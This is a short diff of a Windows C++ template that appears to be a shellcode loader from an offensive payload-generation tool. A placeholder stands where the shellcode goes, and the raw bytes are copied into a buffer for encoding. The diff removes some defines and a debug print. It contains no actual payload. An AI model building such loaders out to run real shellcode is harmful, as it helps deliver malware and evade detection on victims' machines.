@@ -1,15 +1,10 @@
-#define _CRT_SECURE_NO_WARNINGS
-#define MAX_ARGS 100
-#define MAX_ARG_LENGTH 255
-
 #include <windows.h>
-#include <processenv.h>
 #include <iostream>
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
 
-//####USING####
+//####INCLUDE####
 
 //####DEFINE####
 
@@ -24,9 +19,6 @@ DWORD WINAPI esc_main(LPVOID lpParameter)
     const unsigned char raw[] = ####SHELLCODE####;
     int length = sizeof(raw);
 
-
-    printf("\n");
-    printf("sizeOfRaw: %d ",length);
     unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
     memcpy(encoded, raw, length);
     //SIZE_T bytesWritten;
